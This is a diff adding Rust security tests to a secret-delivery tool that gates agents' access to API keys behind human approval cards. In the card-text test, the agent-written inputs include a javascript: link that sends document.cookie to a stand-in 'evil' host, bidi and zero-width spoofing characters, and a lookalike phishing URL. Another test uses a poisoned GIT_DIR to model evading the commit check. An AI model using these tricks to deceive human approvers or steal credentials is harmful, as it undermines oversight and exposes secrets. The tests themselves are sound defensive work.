@@ -2045,3 +2045,350 @@ fn a_paste_into_a_re_created_directory_does_not_wipe_the_old_record() {
     assert_ne!(fresh.id, ws.id);
     assert!(db.grants_for(&ws.id).unwrap().is_empty(), "replaced by the human's pairing");
 }
+
+// ---------------------------------------------------------------------------
+// Pre-launch hardening. Each test below is a defect a reviewer found before the
+// first public release; the comment on each says what breaks without the fix.
+// ---------------------------------------------------------------------------
+
+/// A generated secret belongs to the project that generated it. Shared, one directory
+/// holding a broad grant would receive another application's signing key and could mint
+/// sessions for it.
+#[test]
+fn a_generated_secret_is_per_project() {
+    let _g = env_lock();
+    let (home, a) = v2_world("gen");
+    let b = tmp("v2-gen-other-proj").canonicalize().unwrap();
+    let cfg = Config::default();
+    let db = Db::open(&home.join("t.db")).unwrap();
+    let stash = stash::open(&cfg).unwrap();
+    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
+
+    let out = need::need(&ctx, &a, "agent", &["JWT_SECRET".to_string()], &Default::default()).unwrap();
+    assert!(matches!(&out[0], need::Outcome::Injected { generated: true, .. }), "{:?}", out[0]);
+
+    // B is paired and allowed broadly — the widest standing consent there is.
+    let ws = db.workspace_for(&b).unwrap();
+    for identity in ["default", &need::project_identity(&b)] {
+        db.grant(&ws.id, "*", identity, db::GRANT_BROAD, db::GRANT_PAIRING).unwrap();
+    }
+    let out = need::need(&ctx, &b, "agent", &["JWT_SECRET".to_string()], &Default::default()).unwrap();
+    assert!(matches!(&out[0], need::Outcome::Injected { generated: true, .. }), "B generates its own: {:?}", out[0]);
+
+    let va = std::fs::read_to_string(a.join(".env.local")).unwrap();
+    let vb = std::fs::read_to_string(b.join(".env.local")).unwrap();
+    assert_ne!(va, vb, "B must not receive A's signing key");
+    assert_ne!(need::project_identity(&a), need::project_identity(&b));
+    std::env::remove_var("TOKENSTASH_HOME"); std::env::remove_var("TOKENSTASH_STASH");
+}
+
+/// "No" to this key here outlives a broad grant. Without this, denying a card and then
+/// pasting the key for another project turns the next request into a silent delivery.
+#[test]
+fn a_broad_grant_does_not_overrule_a_denial_for_this_key() {
+    let _g = env_lock();
+    let (home, proj) = v2_world("deny-broad");
+    let cfg = Config::default();
+    let db = Db::open(&home.join("t.db")).unwrap();
+    let stash = stash::open(&cfg).unwrap();
+    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
+    // The value exists in the stash (pasted for some other project).
+    stash.set(&stash::stash_key("RESEND_API_KEY", "default"), &SecretString::from("re_aaaaaaaaaaaaaaaaaaaa".to_string())).unwrap();
+    // This directory is paired and allowed broadly...
+    let ws = db.workspace_for(&proj).unwrap();
+    db.grant(&ws.id, "*", "default", db::GRANT_BROAD, db::GRANT_PAIRING).unwrap();
+    // ...but the human denied this key here.
+    let t = tasks::create_secret_task(&ctx, &proj, "agent", "RESEND_API_KEY", "default", &Default::default()).unwrap();
+    tasks::deny(&ctx, &t, Some("not in this project")).unwrap();
+
+    let out = need::need(&ctx, &proj, "agent", &["RESEND_API_KEY".to_string()], &Default::default()).unwrap();
+    assert!(matches!(&out[0], need::Outcome::Denied { .. }), "{:?}", out[0]);
+    assert!(!proj.join(".env.local").exists(), "nothing written");
+    // --force is still the human's own way to ask again
+    let opts = need::NeedOpts { force: true, ..Default::default() };
+    let out = need::need(&ctx, &proj, "agent", &["RESEND_API_KEY".to_string()], &opts).unwrap();
+    assert!(matches!(&out[0], need::Outcome::Injected { .. }), "{:?}", out[0]);
+    std::env::remove_var("TOKENSTASH_HOME"); std::env::remove_var("TOKENSTASH_STASH");
+}
+
+/// Generating is delivering: it writes a value and leaves a standing grant, so a
+/// `run`-derived request must pass the same one-time approval a hit does.
+#[test]
+fn generating_a_secret_still_needs_the_run_approval() {
+    let _g = env_lock();
+    let (home, proj) = v2_world("gen-approval");
+    let cfg = Config::default();
+    let db = Db::open(&home.join("t.db")).unwrap();
+    let stash = stash::open(&cfg).unwrap();
+    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
+    let opts = need::NeedOpts { require_approval: true, ..Default::default() };
+    let out = need::need(&ctx, &proj, "prog", &["AUTH_SECRET".to_string()], &opts).unwrap();
+    match &out[0] {
+        need::Outcome::Pending { task_id, .. } => {
+            assert_eq!(db.get_task(task_id).unwrap().unwrap().kind, db::TaskKind::Approval);
+        }
+        o => panic!("{o:?}"),
+    }
+    assert!(!proj.join(".env.local").exists(), "nothing generated before the human said yes");
+    std::env::remove_var("TOKENSTASH_HOME"); std::env::remove_var("TOKENSTASH_STASH");
+}
+
+/// The card is the human's read of what an agent asked for. The agent writes some of that
+/// text, so it may not carry a link the human clicks into anything but http(s), and may not
+/// contain characters that reorder or hide what is displayed.
+#[test]
+fn a_card_never_carries_agent_chosen_markup_or_links() {
+    let _g = env_lock();
+    let (home, proj) = v2_world("card-text");
+    let cfg = Config::default();
+    let db = Db::open(&home.join("t.db")).unwrap();
+    let stash = stash::open(&cfg).unwrap();
+    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
+
+    let req = tasks::SecretRequest {
+        why: Some("pay\u{202e}drowssap\u{0007} \u{200b}now".to_string()),
+        url: Some("javascript:fetch('//evil/'+document.cookie)".to_string()),
+        steps: vec!["a".repeat(400), "\u{2066}spoof\u{2069}".to_string()],
+        pattern: None,
+    };
+    let t = tasks::create_secret_task(&ctx, &proj, "agent", "MY_INTERNAL_KEY", "default", &req).unwrap();
+    assert_eq!(t.url, None, "a javascript: link is never stored");
+    let why = t.why.clone().unwrap();
+    assert!(!why.contains('\u{202e}') && !why.contains('\u{200b}') && !why.contains('\u{0007}'), "{why:?}");
+    assert!(t.steps[0].chars().count() <= 200, "steps are capped");
+    assert!(!t.steps[1].contains('\u{2066}'));
+
+    // For a name the registry knows, the provider's link wins: an agent cannot point the
+    // "Open …" button at its own lookalike page in the flow where a key is produced.
+    let req = tasks::SecretRequest { url: Some("https://openai-support.example/verify".to_string()), ..Default::default() };
+    let t = tasks::create_secret_task(&ctx, &proj, "agent", "OPENAI_API_KEY", "default", &req).unwrap();
+    assert_eq!(t.url.as_deref(), registry::lookup("OPENAI_API_KEY").map(|p| p.url.as_str()));
+    // An unregistered name keeps the agent's link — it is the only one there is — but only
+    // if it is http(s).
+    let req = tasks::SecretRequest { url: Some("https://internal.example/keys".to_string()), ..Default::default() };
+    let t = tasks::create_secret_task(&ctx, &proj, "agent", "ANOTHER_INTERNAL_KEY", "default", &req).unwrap();
+    assert_eq!(t.url.as_deref(), Some("https://internal.example/keys"));
+    std::env::remove_var("TOKENSTASH_HOME"); std::env::remove_var("TOKENSTASH_STASH");
+}
+
+/// `GIT_DIR` and friends change git's answers. Both protections that stand between a secret
+/// and a commit run git, so an agent that sets them must not be able to talk tokenstash out
+/// of either one.
+#[test]
+fn git_environment_variables_cannot_disable_the_tracked_check() {
+    let _g = env_lock();
+    let dir = tmp("git-env").canonicalize().unwrap();
+    let git = |args: &[&str]| {
+        std::process::Command::new("git").arg("-C").arg(&dir).args(args)
+            .env("GIT_AUTHOR_NAME", "t").env("GIT_AUTHOR_EMAIL", "t@t").env("GIT_COMMITTER_NAME", "t").env("GIT_COMMITTER_EMAIL", "t@t")
+            .stdout(std::process::Stdio::null()).stderr(std::process::Stdio::null()).status().unwrap()
+    };
+    git(&["init", "-q", "."]);
+    std::fs::write(dir.join(".env.local"), "OLD=1\n").unwrap();
+    git(&["add", "-f", ".env.local"]);
+    git(&["commit", "-q", "-m", "oops"]);
+    assert!(envfile::is_git_tracked(&dir, &dir.join(".env.local")));
+
+    std::env::set_var("GIT_DIR", "/nonexistent-git-dir");
+    std::env::set_var("GIT_WORK_TREE", "/nonexistent-work-tree");
+    let tracked = envfile::is_git_tracked(&dir, &dir.join(".env.local"));
+    let write = envfile::write(&dir, ".env.local", "K", &SecretString::from("vvvvvvvv".to_string()));
+    std::env::remove_var("GIT_DIR");
+    std::env::remove_var("GIT_WORK_TREE");
+
+    assert!(tracked, "a poisoned GIT_DIR must not turn a tracked file into an untracked one");
+    assert!(write.is_err(), "and the write is still refused");
+    assert_eq!(std::fs::read_to_string(dir.join(".env.local")).unwrap(), "OLD=1\n");
+}
+
+/// Inside a repo, "git could not answer" is not "ignored". Our own evaluator settles it only
+/// when the rule we wrote is the only ignore file that can apply.
+#[test]
+fn an_unverifiable_ignore_rule_refuses_the_write() {
+    let _g = env_lock();
+    // A repo git itself cannot read: `check-ignore` fails, so only our own evaluation is
+    // left, and it is complete only when no other ignore file can apply.
+    let root = tmp("unverifiable").canonicalize().unwrap();
+    std::fs::create_dir_all(root.join(".git")).unwrap();
+    let proj = root.join("app");
+    std::fs::create_dir_all(&proj).unwrap();
+    envfile::write(&proj, ".env.local", "K", &SecretString::from("vvvvvvvv".to_string())).unwrap();
+    assert!(envfile::gitignore_covers(&std::fs::read_to_string(root.join(".gitignore")).unwrap(), ".env.local"));
+
+    // Now put an ignore file between a project and the repo root. It can re-include what a
+    // higher rule ignored, and only git can say — which is exactly what we cannot ask.
+    let deeper = root.join("svc/web");
+    std::fs::create_dir_all(&deeper).unwrap();
+    std::fs::write(root.join("svc/.gitignore"), "!.env.local\n").unwrap();
+    let e = envfile::write(&deeper, ".env.local", "K", &SecretString::from("vvvvvvvv".to_string())).unwrap_err();
+    assert!(format!("{e:#}").contains("cannot ask git"), "{e:#}");
+    assert!(!deeper.join(".env.local").exists(), "nothing written");
+}
+
+/// A card is closed once. Two answers racing must not let the loser overwrite the winner —
+/// that is how a committed denial becomes an approval.
+#[test]
+fn a_card_that_is_already_answered_cannot_be_answered_again() {
+    let _g = env_lock();
+    let (home, proj) = v2_world("close-once");
+    let cfg = Config::default();
+    let db = Db::open(&home.join("t.db")).unwrap();
+    let stash = stash::open(&cfg).unwrap();
+    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
+    let t = tasks::create_secret_task(&ctx, &proj, "agent", "RESEND_API_KEY", "default", &Default::default()).unwrap();
+    tasks::deny(&ctx, &t, Some("no")).unwrap();
+    // `t` is the copy the second answerer read before the denial landed.
+    let e = tasks::answer_secret(&ctx, &t, SecretString::from("re_bbbbbbbbbbbbbbbbbbbb".to_string()), true).unwrap_err();
+    assert!(format!("{e:#}").contains("somewhere else"), "{e:#}");
+    assert_eq!(db.get_task(&t.id).unwrap().unwrap().status, db::TaskStatus::Denied);
+    assert!(stash.get(&stash::stash_key("RESEND_API_KEY", "default")).unwrap().is_none(), "nothing stored");
+    std::env::remove_var("TOKENSTASH_HOME"); std::env::remove_var("TOKENSTASH_STASH");
+}
+
+/// The agent-facing lookup is scoped to its own project, including the ambiguous case:
+/// `find_task`'s "did you mean" names task ids, and those must never come from elsewhere.
+#[test]
+fn a_task_prefix_never_reaches_across_projects() {
+    let _g = env_lock();
+    let (home, mine) = v2_world("scope-mine");
+    let theirs = tmp("v2-scope-theirs-proj").canonicalize().unwrap();
+    let cfg = Config::default();
+    let db = Db::open(&home.join("t.db")).unwrap();
+    let stash = stash::open(&cfg).unwrap();
+    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
+    let a = tasks::create_secret_task(&ctx, &mine, "agent", "RESEND_API_KEY", "default", &Default::default()).unwrap();
+    let b = tasks::create_secret_task(&ctx, &theirs, "agent", "OPENAI_API_KEY", "default", &Default::default()).unwrap();
+    let mine_id = mine.to_string_lossy().to_string();
+
+    assert_eq!(db.find_task_in(&mine_id, &a.id).unwrap().map(|t| t.id), Some(a.id.clone()));
+    assert!(db.find_task_in(&mine_id, &b.id).unwrap().is_none(), "another project's exact id is not found");
+    // "t" matches both across the whole table; scoped, it can only ever match this project's
+    assert!(db.find_task(&a.id[..3]).is_err() || db.find_task_in(&mine_id, "t").unwrap().is_some());
+    assert!(db.find_task_in(&mine_id, "t").unwrap().map(|t| t.project) != Some(theirs.to_string_lossy().to_string()));
+    std::env::remove_var("TOKENSTASH_HOME"); std::env::remove_var("TOKENSTASH_STASH");
+}
+
+/// An identity is part of the stash key and of what the human reads on the card.
+#[test]
+fn identities_are_labels_and_nothing_else() {
+    for good in ["default", "work", "personal-2", "a_b-c"] {
+        assert!(need::valid_identity(good), "{good}");
+    }
+    // The dot is excluded because `bundle` excludes it: one rule, or an export from one
+    // machine fails to import on another.
+    for bad in ["", "has space", "a@b", "a,b", "a.b", "x/../y", &"z".repeat(65)] {
+        assert!(!need::valid_identity(bad), "{bad}");
+    }
+    // Whatever a directory is called, the identity derived from it is a valid one.
+    for dir in ["/tmp/tmp.ACxeIdTmiO", "/tmp/my project (2)", "/", "/tmp/ünïcødé"] {
+        let id = need::project_identity(std::path::Path::new(dir));
+        assert!(need::valid_identity(&id), "{dir} -> {id}");
+    }
+}
+
+/// A database written by a newer tokenstash is refused, not half-understood: its grants may
+/// mean something this build does not implement.
+#[test]
+fn a_newer_database_is_refused() {
+    let dir = tmp("schema-ceiling");
+    let path = dir.join("t.db");
+    Db::open(&path).unwrap();
+    let conn = rusqlite::Connection::open(&path).unwrap();
+    conn.execute_batch(&format!("PRAGMA user_version = {}", db::SCHEMA_VERSION + 1)).unwrap();
+    drop(conn);
+    let e = match Db::open(&path) { Ok(_) => panic!("a newer schema must not open"), Err(e) => e };
+    assert!(format!("{e:#}").contains("newer version"), "{e:#}");
+}
+
+/// Broad grants cover ordinary API keys. They do not cover a token that can push code,
+/// publish a package, redeploy, or read a database.
+#[test]
+fn high_blast_radius_tokens_are_never_covered_by_a_broad_grant() {
+    for name in [
+        "GITHUB_TOKEN", "NPM_TOKEN", "VERCEL_TOKEN", "CLOUDFLARE_API_TOKEN", "FLY_API_TOKEN",
+        "RAILWAY_TOKEN", "UPSTASH_REDIS_REST_TOKEN", "GOOGLE_CLIENT_SECRET", "GITHUB_CLIENT_SECRET",
+        "DATABASE_URL",
+    ] {
+        let p = registry::lookup(name).unwrap_or_else(|| panic!("{name} is in the registry"));
+        assert!(p.sensitive, "{name} must be sensitive");
+        assert!(!crate::trust::broad_applies(p.sensitive, true), "{name} must not ride a broad grant");
+    }
+    // Stripe is sensitive by VALUE: a test-mode key is ordinary, a live one is not.
+    let stripe = registry::lookup("STRIPE_SECRET_KEY").unwrap();
+    assert!(stripe.sensitive_pattern.is_some(), "live Stripe keys are classified at paste time");
+    // ...and an ordinary key still rides a broad grant, or the broad grant would mean nothing.
+    let p = registry::lookup("OPENAI_API_KEY").unwrap();
+    assert!(crate::trust::broad_applies(p.sensitive, true));
+}
+
+/// The registry's `reject_status` is the only thing that turns a provider's non-401 auth
+/// failure into a verdict. Four providers depend on it, and nothing exercised it over the
+/// wire: a refactor that dropped the check would report every dead Gemini key as live.
+#[test]
+fn a_registry_reject_status_produces_a_rejected_verdict() {
+    let v = SecretString::from("AIzaSyProbeValue0000000000".to_string());
+    let t = std::time::Duration::from_secs(1);
+    let mut check = check_for("http://127.0.0.1:1/probe", "bearer");
+    check.reject_status = vec![400];
+
+    let (url, _rx, _h) = loopback("HTTP/1.1 400 Bad Request\r\nContent-Length: 0\r\nConnection: close\r\n\r\n");
+    check.url = url;
+    assert_eq!(validate::liveness(&check, &v, t), validate::Liveness::Rejected(400), "a listed status is a rejection");
+
+    // ...and the same 400 without the registry saying so is NOT a rejection: a bad request
+    // must never take a live key out of service.
+    let (url, _rx, _h) = loopback("HTTP/1.1 400 Bad Request\r\nContent-Length: 0\r\nConnection: close\r\n\r\n");
+    let plain = check_for(&url, "bearer");
+    assert_eq!(validate::liveness(&plain, &v, t), validate::Liveness::Ok);
+
+    // 422 is Brave's; same rule.
+    let (url, _rx, _h) = loopback("HTTP/1.1 422 Unprocessable\r\nContent-Length: 0\r\nConnection: close\r\n\r\n");
+    let mut brave = check_for(&url, "header:X-Subscription-Token");
+    brave.reject_status = vec![422];
+    assert_eq!(validate::liveness(&brave, &v, t), validate::Liveness::Rejected(422));
+}
+
+/// The key only ever crosses the wire over TLS. The registry is compiled in and a test
+/// asserts every URL is https, but the check that matters is the one in the code path.
+#[test]
+fn a_probe_never_sends_the_key_over_plain_http() {
+    let v = SecretString::from("sk-probe-value-000000000000".to_string());
+    let t = std::time::Duration::from_secs(1);
+    // A remote http:// URL is refused before any connection is made: the listener that
+    // would have recorded a request never sees one.
+    let (url, rx, _h) = loopback("HTTP/1.1 200 OK\r\nContent-Length: 0\r\nConnection: close\r\n\r\n");
+    let remote = url.replace("127.0.0.1", "localhost.example.invalid");
+    match validate::liveness(&check_for(&remote, "bearer"), &v, t) {
+        validate::Liveness::Unknown(why) => assert!(why.contains("https"), "{why}"),
+        o => panic!("{o:?}"),
+    }
+    assert!(rx.recv_timeout(std::time::Duration::from_millis(200)).is_err(), "nothing was sent");
+}
+
+/// Every auth style puts the value where the provider expects it. Only `bearer` and a custom
+/// header were ever asserted against a real request.
+#[test]
+fn every_auth_style_is_sent_the_way_the_registry_says() {
+    use secrecy::ExposeSecret;
+    let raw = "KEYVALUE123456789012345678";
+    let v = SecretString::from(raw.to_string());
+    let t = std::time::Duration::from_secs(1);
+    let ok = "HTTP/1.1 200 OK\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";
+
+    let (url, rx, _h) = loopback(ok);
+    validate::liveness(&check_for(&url, "basic-user"), &v, t);
+    let req = rx.recv_timeout(std::time::Duration::from_secs(2)).unwrap();
+    let expect = { use base64::Engine; base64::engine::general_purpose::STANDARD.encode(format!("{raw}:")) };
+    assert!(req.contains(&format!("Authorization: Basic {expect}")), "{req}");
+
+    let (url, rx, _h) = loopback(ok);
+    validate::liveness(&check_for(&url, "prefix:Token"), &v, t);
+    let req = rx.recv_timeout(std::time::Duration::from_secs(2)).unwrap();
+    assert!(req.contains(&format!("Authorization: Token {raw}")), "{req}");
+
+    let (url, rx, _h) = loopback(ok);
+    validate::liveness(&check_for(&url, "query:key"), &v, t);
+    let req = rx.recv_timeout(std::time::Duration::from_secs(2)).unwrap();
+    assert!(req.contains(&format!("/probe?key={raw}")), "{req}");
+    assert!(!req.contains("Authorization"), "a query-auth probe sends no auth header: {req}");
+}
